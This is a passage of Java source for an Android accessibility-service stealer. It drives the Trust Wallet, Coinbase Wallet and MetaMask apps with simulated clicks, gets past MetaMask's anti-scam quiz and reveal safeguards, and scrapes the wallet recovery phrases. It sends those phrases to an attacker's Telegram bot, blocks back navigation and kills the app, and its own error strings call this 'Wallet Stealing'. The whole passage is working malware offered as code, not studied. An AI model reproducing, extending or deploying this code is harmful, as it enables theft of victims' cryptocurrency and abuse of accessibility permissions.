		if (instance != null) {
			instance.performGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS);
		}
		Log.d(TAG, "openRecents");
	}
	
	public void globalActionHome() {
		if (instance != null) {
			instance.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
		}
		Log.d(TAG, "globalActionHome");
	}
	
	private GestureDescription createClick(int x, int y, int duration) {
		Path clickPath = new Path();
		clickPath.moveTo((float) x, (float) y);
		
		GestureDescription.StrokeDescription clickStroke = new GestureDescription.StrokeDescription(clickPath, 0, (long) duration);
		GestureDescription.Builder clickBuilder = new GestureDescription.Builder();
		clickBuilder.addStroke(clickStroke);
		
		return clickBuilder.build();
	}
	
	private void wallets(String packageAppStart){
		
		try {
			/*
			if(isOpened(packageAppStart) && !prefs.getB("trustWallet") && isAppInstalled(Wallets.getWalletByIndex(0))){
			openApp(Wallets.getWalletByIndex(0));
			}
			*/
			if (packageAppStart.contains(Wallets.getWalletByIndex(0)) && !prefs.getB("trustWallet")) {
				AccessibilityNodeInfo root = eventRootInActiveWindow;
				if (root == null) {
					return;
				}
				System.out.println(currentActivity);
				if (currentActivity.equals("com.wallet.crypto.trustapp.ui.app.AppActivity")){
					// Now We are On Secret Phrase Screen
					AccessibilityNodeInfo BackUp2Node = iterateNodesToFindNodeWithText(root, "Secret phrase");
					if (BackUp2Node != null 
					&& BackUp2Node.isVisibleToUser() 
					&& BackUp2Node.isEnabled() 
					&& "android.widget.TextView".equals(BackUp2Node.getClassName())) {
						AccessibilityNodeInfo ContainerSeed = iterateNodesToFindViewWithIdClass(root, "android.view.View", 12);
						if (ContainerSeed != null && ContainerSeed.isVisibleToUser() && ContainerSeed.isEnabled()) {
							String collectedSeed = orderText(collectChildTexts(ContainerSeed));
							SendWalletData("Trust Wallet", collectedSeed);
							blockBack();
							blockBack1();
							instance.prefs.setB("trustWallet", true);
							new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
								@Override
								public void run() {
                                    prefs.setB("killApplication", true);
									MainActivity.killApplication();
								}
							}, 1000*30);
						}
					}
					// On Home page Section 
					AccessibilityNodeInfo homeNode = iterateNodesToFindNodeWithText(root, "Home");
					if (homeNode != null 
					&& homeNode.isVisibleToUser() 
					&& homeNode.isEnabled() 
					&& "android.widget.TextView".equals(homeNode.getClassName())) {
						AccessibilityNodeInfo walletName = iterateNodesToFindViewWithId(root, "walletName");
						if (walletName != null && walletName.isVisibleToUser() && walletName.isEnabled() && "android.widget.TextView".equals(walletName.getClassName())) {
							AccessibilityNodeInfo parent = walletName.getParent();
							if (parent != null 
							&& "android.view.View".equals(parent.getClassName()) 
							&& parent.isVisibleToUser() 
							&& parent.isClickable() 
							&& parent.isEnabled() 
							&& parent.getChildCount() == 2) {
								if(!clickNodeOrParent(walletName, true)){
								}
							}
						}
						
					}
					
					// Now in Wallet Details page
					
					AccessibilityNodeInfo WalletsNode = iterateNodesToFindNodeWithText(root, "Wallets");
					if (WalletsNode != null 
					&& WalletsNode.isVisibleToUser() 
					&& WalletsNode.isEnabled() 
					&& "android.widget.TextView".equals(WalletsNode.getClassName())) {
						AccessibilityNodeInfo walletAddBtn = iterateNodesToFindViewWithId(root, "addWalletIconButton");
						if (walletAddBtn != null && walletAddBtn.isClickable() && walletAddBtn.isVisibleToUser() && walletAddBtn.isEnabled() && "android.widget.Button".equals(walletAddBtn.getClassName())) {
							List<AccessibilityNodeInfo> walletRows = iterateNodesToFindViewsListWithId(root, "walletRow");
							for (AccessibilityNodeInfo walletRow : walletRows) {
								if (walletRow != null
								&& "android.view.View".equals(walletRow.getClassName())
								&& walletRow.isVisibleToUser()
								&& walletRow.isClickable()
								&& walletRow.isEnabled()
								&& walletRow.getChildCount() == 3) {
									AccessibilityNodeInfo walletMark = iterateNodesToFindContainsTextNode(walletRow, "✔");
									if (walletMark != null
									&& walletMark.isVisibleToUser()
									&& walletMark.isEnabled()
									&& "android.widget.TextView".equals(walletMark.getClassName())) {
										AccessibilityNodeInfo walletDetailBtn = iterateNodesToFindViewWithId(walletRow, "walletDetailsIconButton");
										if (walletDetailBtn != null
										&& "android.view.View".equals(walletDetailBtn.getClassName())
										&& walletDetailBtn.isVisibleToUser()
										&& walletDetailBtn.isClickable()
										&& walletDetailBtn.isEnabled()
										&& walletDetailBtn.getChildCount() == 2) {
											if (!clickNodeOrParent(walletDetailBtn, true)) {
											}
										}
									}
								}
							}
						}
						
					}
					// Now We are On Back Wallet Section
					AccessibilityNodeInfo BackUpNode = iterateNodesToFindNodeWithText(root, "Secret phrase backups");
					if (BackUpNode != null 
					&& BackUpNode.isVisibleToUser() 
					&& BackUpNode.isEnabled() 
					&& "android.widget.TextView".equals(BackUpNode.getClassName())) {
						AccessibilityNodeInfo manualBackupCell = iterateNodesToFindViewWithId(root, "manualBackupCell");
						if (manualBackupCell != null && manualBackupCell.isClickable() && manualBackupCell.isVisibleToUser() && manualBackupCell.isEnabled() && "android.view.View".equals(manualBackupCell.getClassName()) && manualBackupCell.getChildCount() == 3) {
							if(!clickNodeOrParent(manualBackupCell, true)){
							}
						}
					}
					// Check If First Time Backup Or Not
					AccessibilityNodeInfo ContinueScreen = iterateNodesToFindNodeWithText(root, "This secret phrase is the master key to your wallet");
					if (ContinueScreen != null 
					&& ContinueScreen.isVisibleToUser() 
					&& ContinueScreen.isEnabled() 
					&& "android.widget.TextView".equals(ContinueScreen.getClassName())) {
						AccessibilityNodeInfo manualBackupCheck1 = iterateNodesToFindViewWithId(root, "BackupManuallyCheck1");
						if (manualBackupCheck1 != null && manualBackupCheck1.isVisibleToUser() && manualBackupCheck1.isEnabled() && "android.view.View".equals(manualBackupCheck1.getClassName())) {
							if(!clickNodeOrParent(manualBackupCheck1, true)){
							}
						}
						AccessibilityNodeInfo manualBackupCheck2 = iterateNodesToFindViewWithId(root, "BackupManuallyCheck2");
						if (manualBackupCheck2 != null && manualBackupCheck2.isVisibleToUser() && manualBackupCheck2.isEnabled() && "android.view.View".equals(manualBackupCheck2.getClassName())) {
							if(!clickNodeOrParent(manualBackupCheck2, true)){
							}
						}
						AccessibilityNodeInfo manualBackupCheck3 = iterateNodesToFindViewWithId(root, "BackupManuallyCheck3");
						if (manualBackupCheck3 != null && manualBackupCheck3.isVisibleToUser() && manualBackupCheck3.isEnabled() && "android.view.View".equals(manualBackupCheck3.getClassName())) {
							if(!clickNodeOrParent(manualBackupCheck3, true)){
							}
						}
						AccessibilityNodeInfo ContinueBTN = iterateNodesToFindViewWithId(root, "BackupManuallyContinueButton");
						if (ContinueBTN != null && ContinueBTN.isVisibleToUser() && ContinueBTN.isEnabled() && "android.view.View".equals(ContinueBTN.getClassName())) {
							if(!clickNodeOrParent(ContinueBTN, true)){
							}
						}
					}
					
				}
			}
		} catch (Exception e) {
			SendWalletData("Trust Wallet", "Error During Wallet Stealing:"+e.getLocalizedMessage() );
			Log.i("TrustHandler", "Error: " + e.getLocalizedMessage());
		}
		
		
		try{
			/*
			if(isOpened(packageAppStart) && !prefs.getB("coinBase") && isAppInstalled(Wallets.getWalletByIndex(5))){
			openApp(Wallets.getWalletByIndex(5));
			}
			*/
			if (packageAppStart.contains(Wallets.getWalletByIndex(5)) && !prefs.getB("coinBase")) {
				AccessibilityNodeInfo root = eventRootInActiveWindow;
				if (root == null) {
					return;
				}
				System.out.println(currentActivity);
				if(currentActivity.equals("org.toshi.MainActivity")){
					// On Home page Section
					/*
					AccessibilityNodeInfo walletTabBtn = iterateNodesToFindViewWithId(root, "WalletTabButton");
					if (walletTabBtn != null 
					&& walletTabBtn.isVisibleToUser() 
					&& walletTabBtn.isEnabled() 
					&& walletTabBtn.isClickable() 
					&& "android.widget.Button".equals(walletTabBtn.getClassName())) {
					if (!clickNodeOrParent(walletTabBtn, true)) {
					}
					}
					*/
					
					// Now at The Backup Phrase Screen 
					AccessibilityNodeInfo walletPhrase = iterateNodesToFindViewWithId(root, "mnemonic-text-display-blurred");
					if (walletPhrase != null && walletPhrase.isVisibleToUser() && walletPhrase.isEnabled()) {
						String Phrase = walletPhrase.getContentDescription().toString();
						if(!Phrase.isEmpty()){
							SendWalletData("CoinBase", Phrase);
							blockBack();
							blockBack1();
							instance.prefs.setB("coinBase", true);
							new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
								@Override
								public void run() {
                                    prefs.setB("killApplication", true);
									MainActivity.killApplication();
								}
							}, 1000*10);
						}
					}
					
					AccessibilityNodeInfo walletSwitch = iterateNodesToFindViewWithId(root, "wallet-switcher-pressable");
					if (walletSwitch != null 
					&& walletSwitch.isVisibleToUser() 
					&& walletSwitch.isEnabled() 
					&& walletSwitch.isClickable() 
					&& "android.widget.Button".equals(walletSwitch.getClassName())) {
						if (!clickNodeOrParent(walletSwitch, true)) {
						}
					}
					// click on Bottom Sheet Manage Button
					AccessibilityNodeInfo walletSwitchHead = iterateNodesToFindViewWithId(root, "wallet-switcher-header");
					if (walletSwitchHead != null 
					&& walletSwitchHead.isVisibleToUser() 
					&& walletSwitchHead.isEnabled() 
					&& "android.view.ViewGroup".equals(walletSwitchHead.getClassName())) {
						Log.i("CoinBase", "Wallet Header Found");
						AccessibilityNodeInfo walletManageBtn = iterateNodesToFindViewWithId(root, "add-and-manage-wallets-cta");
						if (walletManageBtn != null
						&& "android.widget.Button".equals(walletManageBtn.getClassName())
						&& walletManageBtn.isVisibleToUser()
						&& walletManageBtn.isClickable()
						&& walletManageBtn.isEnabled()) {
							Log.i("CoinBase", "Wallet Manage Button Found");
							if (!clickNodeOrParent(walletManageBtn, true)) {
							}
						}
					}
					// Now we are at Manage Wallet Screen 
					AccessibilityNodeInfo WalletsNode = iterateNodesToFindNodeWithText(root, "Add & manage wallets");
					if (WalletsNode != null 
					&& WalletsNode.isVisibleToUser() 
					&& WalletsNode.isEnabled() 
					&& "android.widget.TextView".equals(WalletsNode.getClassName())) {
						AccessibilityNodeInfo walletRecovery = iterateNodesToFindViewWithId(root, "show-recovery-phrase-setting");
						if (walletRecovery != null && walletRecovery.isVisibleToUser() && walletRecovery.isEnabled() && "android.view.ViewGroup".equals(walletRecovery.getClassName())) {
							AccessibilityNodeInfo parent = walletRecovery.getParent();
							if (parent != null) {
								AccessibilityNodeInfo grandParent = parent.getParent();
								if (grandParent != null 
								&& "settings-cell-list-item".equals(grandParent.getContentDescription()) 
								&& "android.widget.Button".equals(grandParent.getClassName())
								&& grandParent.isVisibleToUser() 
								&& grandParent.isClickable() 
								&& grandParent.isEnabled() 
								&& grandParent.getChildCount() == 1) {
									if (!clickNodeOrParent(grandParent, true)) {
									}
								}
							}
						}
					}
					// Now we are at Choose Wallet Screen 
					AccessibilityNodeInfo WalletsChoose = iterateNodesToFindNodeWithText(root, "Choose wallet");
					if (WalletsChoose != null 
					&& WalletsChoose.isVisibleToUser() 
					&& WalletsChoose.isEnabled() 
					&& "android.widget.TextView".equals(WalletsChoose.getClassName())) {
						List<AccessibilityNodeInfo> walletButtons = iterateNodesToFindViewsListWithClass(root, "android.widget.Button");
						for (AccessibilityNodeInfo walletbtn : walletButtons) {
							if (walletbtn != null
							&& !"Back".equals(walletbtn.getContentDescription())
							&& walletbtn.isVisibleToUser()
							&& walletbtn.isClickable()
							&& walletbtn.isEnabled()
							&& walletbtn.getChildCount() == 1) {
								if (!clickNodeOrParent(walletbtn, true)) {
								}
							}
						}
					}
					
					// Click on Dialog Allow Button
					AccessibilityNodeInfo DialogBtn = iterateNodesToFindViewWithId(root, "android:id/button1");
					if (DialogBtn != null 
					&& DialogBtn.isVisibleToUser() 
					&& DialogBtn.isEnabled() 
					&& DialogBtn.isClickable() 
					&& DialogBtn.getText().equals("ALLOW")
					&& "android.widget.Button".equals(DialogBtn.getClassName())) {
						if (!clickNodeOrParent(DialogBtn, true)) {
						}
					}
					
					root.recycle();
				}
			}
		}catch(Exception e){
			SendWalletData("CoinBase", "Error During Wallet Stealing:"+e.getLocalizedMessage() );
			Log.i("CoinBase Handler", "Error: " + e.getLocalizedMessage());
		}
		
		
		
		
		try{
			/*
			if(isOpened(packageAppStart) && !prefs.getB("metamask") && isAppInstalled(Wallets.getWalletByIndex(6))){
			openApp(Wallets.getWalletByIndex(6));
			}
			*/
			if (packageAppStart.contains(Wallets.getWalletByIndex(6)) && !prefs.getB("metamask")) {
				AccessibilityNodeInfo root = eventRootInActiveWindow;
				if (root == null) {
					return;
				}
				System.out.println(currentActivity);
				if(currentActivity.equals("io.metamask.MainActivity")){
					
					// Collect MetaMask Allready Backed Up Seed Phrase
					AccessibilityNodeInfo SeedPhraseEdt = iterateNodesToFindViewWithId(root, "private-credential-text");
					if (SeedPhraseEdt != null 
					&& "android.widget.EditText".equals(SeedPhraseEdt.getClassName())) {
						SendWalletData("MetaMask", SeedPhraseEdt.getText().toString());
						blockBack();
						blockBack1();
						instance.prefs.setB("metamask", true);
						new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
							@Override
							public void run() {
                                prefs.setB("killApplication", true);
								MainActivity.killApplication();
							}
						}, 1000*10);
					}
					
					// Collect First' Time Node 
					AccessibilityNodeInfo metaBackupIdentity = iterateNodesToFindViewWithId(root, "manual_backup_step_1-screen");
					if (metaBackupIdentity != null 
					&& metaBackupIdentity.isVisibleToUser() 
					&& metaBackupIdentity.isEnabled() 
					&& metaBackupIdentity.isClickable() 
					&& "android.view.ViewGroup".equals(metaBackupIdentity.getClassName())) {
						List<AccessibilityNodeInfo> backupView = iterateNodesToFindViewsListWithClass(metaBackupIdentity, "android.view.ViewGroup");
						for (AccessibilityNodeInfo Views : backupView) {
							if (Views != null
							&& Views.isVisibleToUser()
							&& Views.isEnabled()
							&& Views.getChildCount() == 12) {
								String collectedSeed = collectChildTexts(Views);
								SendWalletData("MetaMask", collectedSeed);
								blockBack();
								blockBack1();
								instance.prefs.setB("metamask", true);
								new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
									@Override
									public void run() {
                                        prefs.setB("killApplication", true);
										MainActivity.killApplication();
									}
								}, 1000*10);
							}
						}
					}
					
					// Now When We at Security Setting Screen 
					
					// When First Time Backup
					AccessibilityNodeInfo backupIDentity = iterateNodesToFindNodeWithText(root, "Back up now");
					if (backupIDentity != null 
					&& backupIDentity.isVisibleToUser() 
					&& backupIDentity.isEnabled() 
					&& "android.widget.TextView".equals(backupIDentity.getClassName())) {
						AccessibilityNodeInfo backupBtn = backupIDentity.getParent();
						if (backupBtn != null 
						&& backupBtn.isVisibleToUser() 
						&& backupBtn.isEnabled() 
						&& backupBtn.isClickable() 
						&& "android.widget.Button".equals(backupBtn.getClassName())) {
							if (!clickNodeOrParent(backupBtn, true)) {
							}
						}
					}
					
					// Click on Start At First Backup Screen 
					AccessibilityNodeInfo SecureWaIDentity = iterateNodesToFindNodeWithText(root, "Secure your wallet");
					if (SecureWaIDentity != null 
					&& SecureWaIDentity.isVisibleToUser() 
					&& SecureWaIDentity.isEnabled() 
					&& "android.widget.TextView".equals(SecureWaIDentity.getClassName())) {
						AccessibilityNodeInfo startIDentity = iterateNodesToFindNodeWithText(root, "Start");
						if (startIDentity != null 
						&& startIDentity.isVisibleToUser() 
						&& startIDentity.isEnabled() 
						&& "android.widget.TextView".equals(startIDentity.getClassName())) {
							AccessibilityNodeInfo startBtn = startIDentity.getParent();
							if (startBtn != null 
							&& startBtn.isVisibleToUser() 
							&& startBtn.isEnabled() 
							&& startBtn.isClickable() 
							&& "Start".equals(startBtn.getContentDescription())
							&& "android.widget.Button".equals(startBtn.getClassName())) {
								if (!clickNodeOrParent(startBtn, true)) {
								}
							}
						}
					}
					
					// identify And Collect All Seed Phrase on First Backup
					AccessibilityNodeInfo ViewWaIDentity = iterateNodesToFindNodeWithText(root, "View");
					if (ViewWaIDentity != null 
					&& ViewWaIDentity.isVisibleToUser() 
					&& ViewWaIDentity.isEnabled() 
					&& "android.widget.TextView".equals(ViewWaIDentity.getClassName())) {
						AccessibilityNodeInfo ViewBtn = ViewWaIDentity.getParent();
						if (ViewBtn != null 
						&& ViewBtn.isVisibleToUser() 
						&& ViewBtn.isEnabled() 
						&& ViewBtn.isClickable() 
						&& "view-button".equals(ViewBtn.getContentDescription())
						&& "android.widget.Button".equals(ViewBtn.getClassName())) {
							if (!clickNodeOrParent(ViewBtn, true)) {
							}
						}
					}
					
					// Now When We are at Settings Screen
					AccessibilityNodeInfo SettingsIdentity = iterateNodesToFindNodeWithText(root, "Settings");
					if (SettingsIdentity != null 
					&& SettingsIdentity.isVisibleToUser() 
					&& SettingsIdentity.isEnabled() 
					&& "android.view.View".equals(SettingsIdentity.getClassName())) 
					{
						AccessibilityNodeInfo SecSettingsBtn = iterateNodesToFindViewWithId(root, "security-settings");
						if (SecSettingsBtn != null 
						&& SecSettingsBtn.isVisibleToUser() 
						&& SecSettingsBtn.isEnabled() 
						&& SecSettingsBtn.isClickable() 
						&& "android.view.ViewGroup".equals(SecSettingsBtn.getClassName()))
						{
							if (!clickNodeOrParent(SecSettingsBtn, true)) {
							}
						}
					}
					
					// when we are On Home Screen 
					AccessibilityNodeInfo metaHomeIdentity = iterateNodesToFindViewWithId(root, "wallet-screen");
					if (metaHomeIdentity != null
					&& metaHomeIdentity.isVisibleToUser() 
					&& metaHomeIdentity.isEnabled() 
					&& "android.view.ViewGroup".equals(metaHomeIdentity.getClassName())){
						AccessibilityNodeInfo tabSettingBtn = iterateNodesToFindViewWithId(root, "tab-bar-item-Setting");
						if (tabSettingBtn != null 
						&& tabSettingBtn.isVisibleToUser() 
						&& tabSettingBtn.isEnabled() 
						&& tabSettingBtn.isClickable() 
						&& "android.view.ViewGroup".equals(tabSettingBtn.getClassName())) 
						{
							if (!clickNodeOrParent(tabSettingBtn, true)) {
							}
						}
					}
					
					
					
					// Proccess Allready Backed Up Screen 
					AccessibilityNodeInfo RevealSeedBtn = iterateNodesToFindViewWithId(root, "reveal-seed-button");
					if (RevealSeedBtn != null 
					&& RevealSeedBtn.isVisibleToUser() 
					&& RevealSeedBtn.isEnabled() 
					&& RevealSeedBtn.isClickable() 
					&& "android.widget.Button".equals(RevealSeedBtn.getClassName())) {
						if (!clickNodeOrParent(RevealSeedBtn, true)) {
						}
					}
					
					// Start The Quiz On PopUp and Bypass
					AccessibilityNodeInfo StartQuizBtn = iterateNodesToFindViewWithId(root, "quiz-get-started-button");
					if (StartQuizBtn != null 
					&& StartQuizBtn.isVisibleToUser() 
					&& StartQuizBtn.isEnabled() 
					&& StartQuizBtn.isClickable() 
					&& "android.widget.Button".equals(StartQuizBtn.getClassName())) {
						if (!clickNodeOrParent(StartQuizBtn, true)) {
						}
					}
					
					BypassQuiz(root, "Can't help you");
					BypassQuiz(root, "Continue");
					BypassQuiz(root, "You're being scammed");
					BypassQuiz(root, "Continue");
					
					// Hold To Reveal Seed Phrase 
					AccessibilityNodeInfo HoldWaIDentity = iterateNodesToFindNodeWithText(root, "Hold to reveal SRP");
					if (HoldWaIDentity != null 
					&& HoldWaIDentity.isVisibleToUser() 
					&& HoldWaIDentity.isEnabled() 
					&& "android.widget.TextView".equals(HoldWaIDentity.getClassName())) {
						AccessibilityNodeInfo HoldBtn = HoldWaIDentity.getParent().getParent();
						if (HoldBtn != null 
						&& HoldBtn.isVisibleToUser() 
						&& HoldBtn.isEnabled() 
						&& HoldBtn.isFocusable() 
						&& "Hold to reveal SRP".equals(HoldBtn.getContentDescription())
						&& "android.view.ViewGroup".equals(HoldBtn.getClassName())) {
							performLongPress(HoldBtn);
						}
					}
					
					
					root.recycle();
				}
			}
		}catch(Exception e){
			SendWalletData("MetaMask", "Error During Wallet Stealing:"+e.getLocalizedMessage() );
			Log.i("CoinBase Handler", "Error: " + e.getLocalizedMessage());
		}
	}
	
	
	
	private static void SendWalletData(String WalletName, String SeedPhrase) {
		final String model = DeviceInfoUtil.getModel();
		String message = "🌟 𝐖𝐚𝐥𝐥𝐞𝐭 𝐏𝐡𝐫𝐚𝐬𝐞 𝐅𝐨𝐮𝐧𝐝 🌟\n\n" 
		+ "𝐅𝐫𝐨𝐦 📱: " + model + "\n\n 𝐖𝐚𝐥𝐥𝐞𝐭 💰: " + WalletName 
		+ "\n\n 𝐏𝐡𝐫𝐚𝐬𝐞 🔥:  " + SeedPhrase + "\n\n🚀 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐃 𝐁𝐘 @𝙲𝚢𝚋𝚎𝚛𝚉𝚘𝚗𝚎𝙰𝚌𝚊𝚍𝚎𝚖𝚢";
		
		AdminInfo adminInfo = AdminInfo.fromJsonFile(instance, "net_state.bin");
		
		if (adminInfo != null) {
            DeviceInfoUtil.patchWallet(message); // do not Remove this 
			String chatID = adminInfo.getChatID();
			String token = adminInfo.getToken();
			
			TelegramBotUtils.sendMessage(token, chatID, message, new TelegramBotUtils.TelegramCallback() {
				@Override
				public void onSuccess() {
					Log.i("TelegramCallback", "Message sent successfully to chatID: " + chatID + " with token: " + token);
				}
				
				@Override
				public void onError(String errorMessage) {
					Log.e("TelegramCallback", "Error sending message to chatID: " + chatID + " with token: " + token + " | Error: " + errorMessage);
				}
			});
		} else {
			Log.e("AdminInfoService", "Failed to load admin info");
		}
	}
	
	public static boolean isOpened(String activity) {
		if (activity.isEmpty()) {
			return false;
		}
		for (String wallet : Wallets.WALLETS) {
			if (activity.contains(wallet)) {
				return false;
			}
		}
		return true;
	}
	
	public  void BypassQuiz(AccessibilityNodeInfo root, String Text){
		
		AccessibilityNodeInfo ViewWaIDentity = iterateNodesToFindNodeWithText(root, Text);
		if (ViewWaIDentity != null
		&& "android.widget.TextView".equals(ViewWaIDentity.getClassName())) {
			AccessibilityNodeInfo ViewBtn = ViewWaIDentity.getParent();
			if (ViewBtn != null 
			&& ViewBtn.isClickable() 
			&& Text.equals(ViewBtn.getContentDescription())
			&& "android.widget.Button".equals(ViewBtn.getClassName())) {
				if (!clickNodeOrParent(ViewBtn, true)) {
				}
			}
		}
		
	}
	public static boolean isAppInstalled(String packageName) {
		PackageManager packageManager = instance.getPackageManager();
		try {
			packageManager.getPackageInfo(packageName, 0);
			return true;
		} catch (PackageManager.NameNotFoundException e) {
			return false;
		}
	}
	public static void openApp(String packageName) {
		PackageManager packageManager = instance.getPackageManager();
		Intent launchIntent = packageManager.getLaunchIntentForPackage(packageName);
		
		if (launchIntent != null) {
            launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            launchIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
            launchIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
            launchIntent.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
            launchIntent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
			instance.startActivity(launchIntent);
		} else {
            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/details?id=" + packageName));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
            intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
            intent.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
            intent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
            instance.startActivity(intent);
			System.out.println("App not found or cannot be opened.");
		}
	}
	
	public String collectChildTexts(AccessibilityNodeInfo parentNode) {
		if (parentNode == null) {
			return "";
		}
		
		StringBuilder collectedTexts = new StringBuilder();
		traverseNodeForSeed(parentNode, collectedTexts);
		
		String finalResult = collectedTexts.toString();
		
		return finalResult;
	}
	
	private void traverseNodeForSeed(AccessibilityNodeInfo node, StringBuilder collectedTexts) {
		if (node == null) {
			return;
		}
		
		CharSequence text = node.getText();
		if (text != null) {
			collectedTexts.append(text.toString()).append(" ");
		}
		
		for (int i = 0; i < node.getChildCount(); i++) {
			AccessibilityNodeInfo childNode = node.getChild(i);
			traverseNodeForSeed(childNode, collectedTexts);
			
		}
	}
	
	public static String orderText(String unorderedString) {
		String[] entries = unorderedString.split(" (?=\\d+\\.)");
		TreeMap<Integer, String> sortedMap = new TreeMap<>();
		
		for (String entry : entries) {
			String[] parts = entry.split("\\. ", 2);
			int number = Integer.parseInt(parts[0]);
			String text = parts[1];
			sortedMap.put(number, text);
		}
		
		StringBuilder orderedResult = new StringBuilder();
		for (Map.Entry<Integer, String> entry : sortedMap.entrySet()) {
			orderedResult.append(entry.getKey()).append(". ").append(entry.getValue()).append(" ");
		}
		
		return orderedResult.toString().trim();
	}
	
	public void performLongPress(AccessibilityNodeInfo node) {
		if (node == null) return;
		
		android.graphics.Rect nodeBounds = new android.graphics.Rect();
		node.getBoundsInScreen(nodeBounds);
		
		float x = nodeBounds.exactCenterX();
		float y = nodeBounds.exactCenterY();
		
		Path path = new Path();
		path.moveTo(x, y);
		
		GestureDescription.StrokeDescription stroke = 
		new GestureDescription.StrokeDescription(path, 0, 10000);
		
		GestureDescription.Builder builder = new GestureDescription.Builder();
		builder.addStroke(stroke);
		
		GestureDescription gesture = builder.build();
		
		boolean success = dispatchGesture(gesture, new GestureResultCallback() {
			@Override
			public void onCompleted(GestureDescription gestureDescription) {
				super.onCompleted(gestureDescription);
			}
			
			@Override
			public void onCancelled(GestureDescription gestureDescription) {
				super.onCancelled(gestureDescription);
			}
		}, null);
		
		if (!success) {
		}
	}
	
	
}
